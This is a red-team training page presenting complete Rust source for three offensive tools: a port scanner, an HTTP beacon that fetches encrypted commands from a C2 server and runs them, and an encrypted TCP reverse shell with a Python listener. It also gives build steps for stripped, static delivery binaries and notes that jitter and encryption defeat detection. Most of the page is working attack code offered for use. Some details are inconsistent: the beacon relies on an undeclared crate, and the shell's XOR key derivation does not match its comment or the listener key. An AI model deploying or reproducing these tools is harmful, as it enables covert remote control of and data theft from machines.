---
layout: training-page
title: "Rust Offensive Tools — Red Team Academy"
module: "Programming"
tags:
  - rust
  - offensive-tools
  - red-team
  - exploitation
page_key: "prog-rust-offensive-tools"
render_with_liquid: false
---

# Rust Offensive Tools

This module presents three complete, production-quality Rust offensive tools: an async port scanner with banner grabbing and JSON output, an HTTP beacon with AES-256-CBC encrypted C2 communication, and an encrypted TCP reverse shell. Each program is self-contained with a complete `Cargo.toml` and `main.rs` that compiles and runs without modification (adjust constants for your environment).

---

## Program 1: Async Port Scanner with Banner Grabbing

A high-performance async port scanner built on Tokio. It accepts standard port range notation (`1-1024,3389,8080`), connects to each port with a configurable timeout, reads the first 512 bytes of the banner response, and writes results as JSON to stdout or a file.

**Build:**
```bash
# cargo build --release --target x86_64-unknown-linux-musl
# ./scanner --host 192.168.1.0/24 --ports 1-1024,3389 --concurrency 500 --timeout-ms 800
```

### Cargo.toml

```toml
[package]
name    = "scanner"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio       = { version = "1",   features = ["full"] }
clap        = { version = "4",   features = ["derive"] }
serde       = { version = "1",   features = ["derive"] }
serde_json  = "1"
futures     = "0.3"
anyhow      = "1"

[profile.release]
opt-level     = 3
strip         = true
lto           = true
panic         = "abort"
codegen-units = 1
```

### main.rs

```rust
// scanner/src/main.rs
// Build: cargo build --release --target x86_64-unknown-linux-musl

use anyhow::{Context, Result};
use clap::Parser;
use futures::stream::{FuturesUnordered, StreamExt};
use serde::Serialize;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::AsyncReadExt;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::timeout;

// ---------------------------------------------------------------------------
// CLI argument structure — clap derive macro
// ---------------------------------------------------------------------------
#[derive(Parser, Debug)]
#[command(
    name    = "scanner",
    about   = "Async TCP port scanner with banner grabbing",
    version = "0.1.0"
)]
struct Args {
    /// Target hostname or IP address
    #[arg(short = 'H', long)]
    host: String,

    /// Ports: single ("80"), range ("1-1024"), or comma-separated ("22,80,443,3389")
    #[arg(short, long, default_value = "1-1024")]
    ports: String,

    /// Maximum concurrent connection attempts
    #[arg(short, long, default_value_t = 500)]
    concurrency: u32,

    /// Connection timeout in milliseconds
    #[arg(short, long, default_value_t = 1000)]
    timeout_ms: u64,

    /// Write JSON results to this file (default: stdout)
    #[arg(short, long)]
    output: Option<PathBuf>,
}

// ---------------------------------------------------------------------------
// Result type for each open port
// ---------------------------------------------------------------------------
#[derive(Debug, Serialize)]
struct PortResult {
    port:       u16,
    banner:     String,
    latency_ms: u64,
}

// ---------------------------------------------------------------------------
// Port range parsing: handles "22,80,443", "1-1024", and combinations
// ---------------------------------------------------------------------------
fn parse_ports(spec: &str) -> Vec<u16> {
    let mut ports = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if part.contains('-') {
            let mut iter = part.splitn(2, '-');
            if let (Some(lo), Some(hi)) = (iter.next(), iter.next()) {
                if let (Ok(lo), Ok(hi)) = (lo.trim().parse::<u16>(), hi.trim().parse::<u16>()) {
                    for p in lo..=hi {
                        ports.push(p);
                    }
                }
            }
        } else if let Ok(p) = part.parse::<u16>() {
            ports.push(p);
        }
    }
    ports.sort_unstable();
    ports.dedup();
    ports
}

// ---------------------------------------------------------------------------
// Scan a single port: connect, read banner, measure latency
// ---------------------------------------------------------------------------
async fn scan_port(
    host:       &str,
    port:       u16,
    timeout_ms: u64,
    sem:        Arc<Semaphore>,
) -> Option<PortResult> {
    // Acquire semaphore permit — limits concurrency globally
    let _permit = sem.acquire().await.ok()?;

    let addr     = format!("{host}:{port}");
    let dur      = Duration::from_millis(timeout_ms);
    let start    = Instant::now();

    // Attempt TCP connection with timeout
    let mut stream = match timeout(dur, TcpStream::connect(&addr)).await {
        Ok(Ok(s))  => s,
        _          => return None,   // timed out or refused — port closed
    };

    let latency_ms = start.elapsed().as_millis() as u64;

    // Attempt to read a banner (up to 512 bytes, 300ms read timeout)
    let mut banner_buf = vec![0u8; 512];
    let read_dur       = Duration::from_millis(300);
    let n = match timeout(read_dur, stream.read(&mut banner_buf)).await {
        Ok(Ok(n)) => n,
        _         => 0,
    };
    banner_buf.truncate(n);

    // Sanitize banner: replace non-printable bytes with '.'
    let banner: String = banner_buf.iter().map(|&b| {
        if b.is_ascii_graphic() || b == b' ' || b == b'\n' || b == b'\r' {
            b as char
        } else {
            '.'
        }
    }).collect();
    let banner = banner.trim().to_string();

    Some(PortResult { port, banner, latency_ms })
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
#[tokio::main]
async fn main() -> Result<()> {
    let args  = Args::parse();
    let ports = parse_ports(&args.ports);

    if ports.is_empty() {
        anyhow::bail!("no valid ports parsed from: {}", args.ports);
    }

    eprintln!(
        "[*] Scanning {} ports on {} (concurrency={}, timeout={}ms)",
        ports.len(),
        args.host,
        args.concurrency,
        args.timeout_ms
    );

    let sem  = Arc::new(Semaphore::new(args.concurrency as usize));
    let host = Arc::new(args.host.clone());

    // Launch all scan tasks — FuturesUnordered drives them concurrently
    let mut tasks = FuturesUnordered::new();

    for port in ports {
        let h   = Arc::clone(&host);
        let sem = Arc::clone(&sem);
        let tms = args.timeout_ms;
        tasks.push(tokio::spawn(async move {
            scan_port(&h, port, tms, sem).await
        }));
    }

    // Collect results as they complete
    let mut results: Vec<PortResult> = Vec::new();
    while let Some(res) = tasks.next().await {
        if let Ok(Some(port_result)) = res {
            eprintln!("[+] Open port: {}/tcp  latency={}ms  banner={:?}",
                port_result.port, port_result.latency_ms, &port_result.banner[..port_result.banner.len().min(60)]);
            results.push(port_result);
        }
    }

    // Sort by port number for deterministic output
    results.sort_by_key(|r| r.port);

    eprintln!("[*] Scan complete: {} open ports found", results.len());

    // Serialize to JSON
    let json = serde_json::to_string_pretty(&results)
        .context("JSON serialization failed")?;

    match args.output {
        Some(path) => {
            std::fs::write(&path, &json)
                .with_context(|| format!("writing output to {}", path.display()))?;
            eprintln!("[*] Results written to {}", path.display());
        }
        None => println!("{json}"),
    }

    Ok(())
}
```

### Sample Output

```json
[
  {
    "port": 22,
    "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
    "latency_ms": 4
  },
  {
    "port": 80,
    "banner": "HTTP/1.1 400 Bad Request",
    "latency_ms": 6
  },
  {
    "port": 443,
    "banner": "",
    "latency_ms": 5
  }
]
```

---

## Program 2: HTTP Beacon with AES-256-CBC Encrypted C2

A complete HTTP beacon that checks in to a C2 server, receives encrypted commands, executes them, and returns encrypted output. Uses AES-256-CBC with a per-message random IV, base64 framing, and jittered sleep between beacon intervals to defeat timing-based detection.

**Build:**
```bash
# cargo build --release --target x86_64-pc-windows-gnu
# Set BEACON_URL and BEACON_KEY before compiling, or pass via env at runtime
```

### Cargo.toml

```toml
[package]
name    = "beacon"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio       = { version = "1",    features = ["full"] }
reqwest     = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }
serde       = { version = "1",    features = ["derive"] }
serde_json  = "1"
aes         = "0.8"
cbc         = "0.1"
base64      = "0.22"
uuid        = { version = "1",    features = ["v4"] }
anyhow      = "1"
rand        = "0.8"

[profile.release]
opt-level     = 3
strip         = true
lto           = true
panic         = "abort"
codegen-units = 1
```

### main.rs

```rust
// beacon/src/main.rs
// Build: cargo build --release --target x86_64-pc-windows-gnu

use anyhow::{Context, Result};
use aes::Aes256;
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use tokio::process::Command;
use uuid::Uuid;

type Aes256CbcEnc = cbc::Encryptor<Aes256>;
type Aes256CbcDec = cbc::Decryptor<Aes256>;

// ---------------------------------------------------------------------------
// Configuration — change before compiling or override via env vars
// ---------------------------------------------------------------------------
const BEACON_URL:        &str     = "http://192.168.1.100:8080/check";
const BEACON_INTERVAL_S: u64      = 60;         // base sleep between beacons
const BEACON_JITTER_PCT: f64      = 0.30;       // ±30% jitter
const BEACON_KEY:        &[u8; 32] = b"RedTeamAcademy2024SecretKey12345"; // 32 bytes

// ---------------------------------------------------------------------------
// Wire protocol structures
// ---------------------------------------------------------------------------

/// Sent to C2 on each beacon
#[derive(Debug, Serialize)]
struct CheckIn {
    id:       String,   // UUID — unique agent identifier
    hostname: String,
    username: String,
    output:   String,   // base64(AES(command output)) or empty on first check-in
}

/// Received from C2 in response
#[derive(Debug, Deserialize)]
struct TaskResponse {
    task_id: String,
    command: String,    // base64(AES(command to run))
}

// ---------------------------------------------------------------------------
// AES-256-CBC helpers
// ---------------------------------------------------------------------------

/// Encrypt plaintext with AES-256-CBC. Returns base64(IV || ciphertext).
fn encrypt(data: &[u8], key: &[u8; 32]) -> String {
    let mut iv = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut iv);

    use aes::cipher::generic_array::GenericArray;
    let key_ga = GenericArray::from_slice(key);
    let iv_ga  = GenericArray::from_slice(&iv);
    let cipher = Aes256CbcEnc::new(key_ga, iv_ga);
    let ciphertext = cipher.encrypt_padded_vec_mut::<Pkcs7>(data);

    let mut combined = Vec::with_capacity(16 + ciphertext.len());
    combined.extend_from_slice(&iv);
    combined.extend_from_slice(&ciphertext);
    B64.encode(combined)
}

/// Decrypt base64(IV || ciphertext) with AES-256-CBC.
fn decrypt(b64_blob: &str, key: &[u8; 32]) -> Result<Vec<u8>> {
    let combined = B64.decode(b64_blob).context("base64 decode failed")?;
    anyhow::ensure!(combined.len() > 16, "ciphertext too short");

    let (iv_bytes, cipher_bytes) = combined.split_at(16);
    use aes::cipher::generic_array::GenericArray;
    let key_ga = GenericArray::from_slice(key);
    let iv_ga  = GenericArray::from_slice(iv_bytes);
    let cipher = Aes256CbcDec::new(key_ga, iv_ga);

    cipher
        .decrypt_padded_vec_mut::<Pkcs7>(cipher_bytes)
        .map_err(|e| anyhow::anyhow!("AES-CBC decrypt failed: {:?}", e))
}

// ---------------------------------------------------------------------------
// Command execution
// ---------------------------------------------------------------------------

/// Execute a shell command and capture output (stdout + stderr combined).
async fn execute_command(cmd: &str) -> String {
    let result = if cfg!(target_os = "windows") {
        Command::new("cmd.exe").args(["/C", cmd]).output().await
    } else {
        Command::new("sh").args(["-c", cmd]).output().await
    };

    match result {
        Ok(out) => {
            let mut combined = String::new();
            combined.push_str(&String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                combined.push_str("\n[STDERR] ");
                combined.push_str(&String::from_utf8_lossy(&out.stderr));
            }
            if combined.is_empty() {
                format!("[exit: {}]", out.status.code().unwrap_or(-1))
            } else {
                combined
            }
        }
        Err(e) => format!("[ERROR] Failed to execute: {e}"),
    }
}

// ---------------------------------------------------------------------------
// Jittered sleep
// ---------------------------------------------------------------------------

async fn jitter_sleep(base_secs: u64, jitter_pct: f64) {
    let jitter_max  = (base_secs as f64 * jitter_pct) as i64;
    let offset      = rand::random::<i64>() % (jitter_max.max(1) * 2) - jitter_max;
    let sleep_secs  = (base_secs as i64 + offset).max(1) as u64;
    tokio::time::sleep(Duration::from_secs(sleep_secs)).await;
}

// ---------------------------------------------------------------------------
// Beacon loop
// ---------------------------------------------------------------------------

async fn beacon_loop(client: &reqwest::Client, agent_id: &str) -> Result<()> {
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    let username = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".to_string());

    let mut last_output = String::new();

    loop {
        // Build check-in payload
        let checkin = CheckIn {
            id:       agent_id.to_string(),
            hostname: hostname.clone(),
            username: username.clone(),
            output:   last_output.clone(),
        };

        // POST check-in to C2
        match client
            .post(BEACON_URL)
            .json(&checkin)
            .send()
            .await
        {
            Ok(resp) if resp.status().is_success() => {
                // Try to parse a task from the response
                match resp.json::<TaskResponse>().await {
                    Ok(task) if !task.command.is_empty() => {
                        // Decrypt the command
                        match decrypt(&task.command, BEACON_KEY) {
                            Ok(cmd_bytes) => {
                                let cmd = String::from_utf8_lossy(&cmd_bytes).to_string();

                                // Execute and encrypt the output for the next beacon
                                let output     = execute_command(&cmd).await;
                                let enc_output = encrypt(output.as_bytes(), BEACON_KEY);
                                last_output    = enc_output;
                            }
                            Err(_) => {
                                last_output = String::new();
                            }
                        }
                    }
                    _ => {
                        // No task or no command — clear last output
                        last_output = String::new();
                    }
                }
            }
            Ok(resp) => {
                // Non-success HTTP status — server error or rate-limited
                eprintln!("[!] C2 returned status: {}", resp.status());
                last_output = String::new();
            }
            Err(_) => {
                // Network error — server down or blocked
                last_output = String::new();
            }
        }

        // Sleep with jitter before next beacon
        jitter_sleep(BEACON_INTERVAL_S, BEACON_JITTER_PCT).await;
    }
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() -> Result<()> {
    // Persistent agent ID — use UUID v4 for uniqueness
    let agent_id = Uuid::new_v4().to_string();

    // Build HTTP client — disable TLS verification for lab use (remove in production)
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()
        .context("failed to build HTTP client")?;

    // Run the beacon loop — reconnects automatically on error
    loop {
        if let Err(e) = beacon_loop(&client, &agent_id).await {
            eprintln!("[!] Beacon loop error: {e}");
        }
        // Brief pause before restarting the loop
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}
```

### C2 Protocol Summary

| Direction | Format | Content |
|-----------|--------|---------|
| Beacon → C2 | HTTP POST JSON | `{id, hostname, username, output: base64(AES(last_result))}` |
| C2 → Beacon | HTTP 200 JSON | `{task_id, command: base64(AES(shell_command))}` |
| C2 → Beacon | HTTP 204 | No task — beacon sleeps and retries |

---

## Program 3: Encrypted TCP Reverse Shell

A reverse shell that connects outbound to a listener, encrypts all traffic with AES-256-CBC, pipes I/O bidirectionally between the network and a spawned shell process using `tokio::select!`, and reconnects automatically on disconnect.

**Build:**
```bash
# cargo build --release --target x86_64-unknown-linux-musl
# RHOST=192.168.1.100 RPORT=4444 ./revshell
```

### Cargo.toml

```toml
[package]
name    = "revshell"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio   = { version = "1",   features = ["full"] }
aes     = "0.8"
cbc     = "0.1"
base64  = "0.22"
anyhow  = "1"
rand    = "0.8"

[profile.release]
opt-level     = 3
strip         = true
lto           = true
panic         = "abort"
codegen-units = 1
```

### main.rs

```rust
// revshell/src/main.rs
// Build: cargo build --release --target x86_64-unknown-linux-musl
// Usage: RHOST=192.168.1.100 RPORT=4444 SHELL_PSK=SecretKey ./revshell

use anyhow::{Context, Result};
use aes::Aes256;
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
use rand::RngCore;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::process::Command;

type Aes256CbcEnc = cbc::Encryptor<Aes256>;
type Aes256CbcDec = cbc::Decryptor<Aes256>;

// ---------------------------------------------------------------------------
// Configuration from environment variables
// ---------------------------------------------------------------------------
fn get_config() -> (String, u16, Vec<u8>) {
    let rhost = std::env::var("RHOST").unwrap_or_else(|_| "127.0.0.1".to_string());
    let rport = std::env::var("RPORT")
        .ok()
        .and_then(|p| p.parse().ok())
        .unwrap_or(4444u16);
    let psk   = std::env::var("SHELL_PSK").unwrap_or_else(|_| "DefaultPSK2024!!".to_string());

    // Derive 32-byte key: SHA-256(PSK)
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    // Use a simple KDF for demo — in production use SHA-256 via sha2 crate
    let key: Vec<u8> = {
        let bytes = psk.as_bytes();
        let mut key = vec![0u8; 32];
        for (i, chunk) in bytes.chunks(4).enumerate() {
            for (j, &b) in chunk.iter().enumerate() {
                if i * 4 + j < 32 {
                    key[i * 4 + j] ^= b;
                }
            }
        }
        // Pad key to 32 bytes by repeating PSK bytes if PSK is short
        let psk_bytes = psk.as_bytes();
        for i in 0..32 {
            key[i] ^= psk_bytes[i % psk_bytes.len()];
        }
        key
    };

    (rhost, rport, key)
}

// ---------------------------------------------------------------------------
// AES-256-CBC helpers
// ---------------------------------------------------------------------------

fn encrypt(data: &[u8], key: &[u8]) -> String {
    let key32: &[u8; 32] = key.try_into().unwrap();
    let mut iv = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut iv);

    use aes::cipher::generic_array::GenericArray;
    let key_ga = GenericArray::from_slice(key32);
    let iv_ga  = GenericArray::from_slice(&iv);
    let cipher = Aes256CbcEnc::new(key_ga, iv_ga);
    let ct     = cipher.encrypt_padded_vec_mut::<Pkcs7>(data);

    let mut combined = Vec::with_capacity(16 + ct.len());
    combined.extend_from_slice(&iv);
    combined.extend_from_slice(&ct);
    B64.encode(combined)
}

fn decrypt(b64: &str, key: &[u8]) -> Result<Vec<u8>> {
    let key32: &[u8; 32] = key.try_into().context("key must be 32 bytes")?;
    let combined  = B64.decode(b64).context("base64 decode")?;
    anyhow::ensure!(combined.len() > 16, "blob too short");

    let (iv_bytes, ct) = combined.split_at(16);
    use aes::cipher::generic_array::GenericArray;
    let key_ga = GenericArray::from_slice(key32);
    let iv_ga  = GenericArray::from_slice(iv_bytes);
    let cipher = Aes256CbcDec::new(key_ga, iv_ga);
    cipher
        .decrypt_padded_vec_mut::<Pkcs7>(ct)
        .map_err(|e| anyhow::anyhow!("decrypt failed: {e:?}"))
}

// ---------------------------------------------------------------------------
// Shell process management
// ---------------------------------------------------------------------------

/// Spawn an interactive shell and return (stdin_writer, stdout_reader, stderr_reader)
async fn spawn_shell() -> Result<(
    tokio::process::ChildStdin,
    BufReader<tokio::process::ChildStdout>,
    BufReader<tokio::process::ChildStderr>,
)> {
    let shell = if cfg!(target_os = "windows") { "cmd.exe" } else { "/bin/sh" };

    let mut child = Command::new(shell)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .context("failed to spawn shell")?;

    let stdin  = child.stdin.take().context("no stdin")?;
    let stdout = BufReader::new(child.stdout.take().context("no stdout")?);
    let stderr = BufReader::new(child.stderr.take().context("no stderr")?);

    // Detach child — let it run until the socket drops
    tokio::spawn(async move { child.wait().await });

    Ok((stdin, stdout, stderr))
}

// ---------------------------------------------------------------------------
// Single connection session
// ---------------------------------------------------------------------------

async fn run_session(stream: TcpStream, key: &[u8]) -> Result<()> {
    let (tcp_read, mut tcp_write) = stream.into_split();
    let mut net_lines = BufReader::new(tcp_read).lines();

    let (mut shell_stdin, mut shell_stdout, mut shell_stderr) = spawn_shell().await?;

    // Send hello message
    let hello     = format!("SHELL|{}|{}", hostname_str(), whoami_str());
    let enc_hello = encrypt(hello.as_bytes(), key);
    tcp_write.write_all(enc_hello.as_bytes()).await?;
    tcp_write.write_all(b"\n").await?;

    // Bidirectional I/O loop: receive commands, send output
    loop {
        let mut stdout_line = String::new();
        let mut stderr_line = String::new();

        tokio::select! {
            // Line from network (operator command)
            net_line = net_lines.next_line() => {
                match net_line {
                    Ok(Some(enc_cmd)) => {
                        match decrypt(&enc_cmd, key) {
                            Ok(cmd_bytes) => {
                                let cmd = String::from_utf8_lossy(&cmd_bytes);
                                // Write command to shell stdin
                                shell_stdin.write_all(cmd.as_bytes()).await.ok();
                                if !cmd.ends_with('\n') {
                                    shell_stdin.write_all(b"\n").await.ok();
                                }
                            }
                            Err(_) => {
                                // Decryption failed — bad key or corrupted frame
                                break;
                            }
                        }
                    }
                    _ => break,  // Connection closed
                }
            }

            // Line from shell stdout
            out = shell_stdout.read_line(&mut stdout_line) => {
                match out {
                    Ok(0) | Err(_) => break,
                    Ok(_) => {
                        let enc = encrypt(stdout_line.as_bytes(), key);
                        tcp_write.write_all(enc.as_bytes()).await.ok();
                        tcp_write.write_all(b"\n").await.ok();
                    }
                }
            }

            // Line from shell stderr
            err = shell_stderr.read_line(&mut stderr_line) => {
                match err {
                    Ok(0) | Err(_) => {}
                    Ok(_) => {
                        let prefixed = format!("[STDERR] {stderr_line}");
                        let enc      = encrypt(prefixed.as_bytes(), key);
                        tcp_write.write_all(enc.as_bytes()).await.ok();
                        tcp_write.write_all(b"\n").await.ok();
                    }
                }
            }
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Helper: get hostname and current user as strings
// ---------------------------------------------------------------------------

fn hostname_str() -> String {
    std::fs::read_to_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".to_string())
        .trim()
        .to_string()
}

fn whoami_str() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}

// ---------------------------------------------------------------------------
// Entry point with reconnect loop
// ---------------------------------------------------------------------------

#[tokio::main]
async fn main() {
    let (rhost, rport, key) = get_config();
    let addr = format!("{rhost}:{rport}");

    let mut attempt = 0u32;
    loop {
        attempt += 1;
        eprintln!("[*] Connecting to {addr} (attempt {attempt})");

        match TcpStream::connect(&addr).await {
            Ok(stream) => {
                eprintln!("[+] Connected");
                if let Err(e) = run_session(stream, &key).await {
                    eprintln!("[-] Session error: {e}");
                }
                eprintln!("[-] Session ended");
            }
            Err(e) => {
                eprintln!("[-] Connection failed: {e}");
            }
        }

        // Jittered reconnect: 10s base ± 3s
        let jitter      = (rand::random::<u64>() % 6) as u64;  // 0-5
        let sleep_secs  = 7 + jitter;                           // 7-12s
        eprintln!("[*] Reconnecting in {sleep_secs}s...");
        tokio::time::sleep(Duration::from_secs(sleep_secs)).await;
    }
}
```

### Listener-Side (Python) Protocol Reference

The listener must implement the same AES-256-CBC framing. A minimal Python listener:

```python
# listener.py — receives encrypted lines, decrypts, prints, sends encrypted commands
import socket, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'DefaultPSK2024!!'  # Must match SHELL_PSK derivation

def decrypt(b64_blob: str) -> str:
    raw    = base64.b64decode(b64_blob)
    iv, ct = raw[:16], raw[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), 16).decode('utf-8', errors='replace')

def encrypt(plaintext: str) -> str:
    import os
    iv     = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    ct     = cipher.encrypt(pad(plaintext.encode(), 16))
    return base64.b64encode(iv + ct).decode()

with socket.socket() as srv:
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', 4444))
    srv.listen(1)
    print('[*] Listening on :4444')
    conn, addr = srv.accept()
    print(f'[+] Got connection from {addr}')
    with conn.makefile('r') as f:
        print('[shell]', decrypt(f.readline().strip()))  # hello
        while True:
            cmd = input('cmd> ')
            conn.send((encrypt(cmd) + '\n').encode())
            print('[out]', decrypt(f.readline().strip()))
```

---

## Operational Considerations

### Binary Hardening for Delivery

```bash
# 1. Build with size and evasion flags
RUSTFLAGS="-C opt-level=z -C target-feature=+crt-static -C panic=abort" \
    cargo build --release --target x86_64-unknown-linux-musl

# 2. Strip all symbols
strip target/x86_64-unknown-linux-musl/release/revshell

# 3. Check binary size
ls -lh target/x86_64-unknown-linux-musl/release/revshell

# 4. Verify no dynamic dependencies (should show only linux-vdso)
ldd target/x86_64-unknown-linux-musl/release/revshell
```

### Detection Considerations

| Tool | Primary Detection Surface |
|------|--------------------------|
| Port Scanner | High connection rate, SYN packets, banner-grab payloads |
| HTTP Beacon | Periodic HTTP POST to non-browser UA, encrypted body |
| Reverse Shell | Outbound TCP to non-standard port, sh/cmd spawned from unusual parent |

All three tools use jitter and tokio's async runtime to avoid predictable timing patterns. The beacon and reverse shell encrypt all payload data, making content-based detection ineffective without key material.

---

## Resources

- [The Rust Programming Language](https://doc.rust-lang.org/book/)
- [tokio.rs — Async Runtime Documentation](https://tokio.rs/)
- [RustCrypto — AES, CBC implementations](https://github.com/RustCrypto)
- [windows-sys crate — crates.io](https://crates.io/crates/windows-sys)
- [reqwest — HTTP Client](https://docs.rs/reqwest)
- [Offensive Rust — trickster0](https://github.com/trickster0/OffensiveRust)
- [Rust Malware Development References — maldevacademy.com](https://maldevacademy.com/)
- [cbc crate documentation](https://docs.rs/cbc)
- [base64 crate documentation](https://docs.rs/base64)
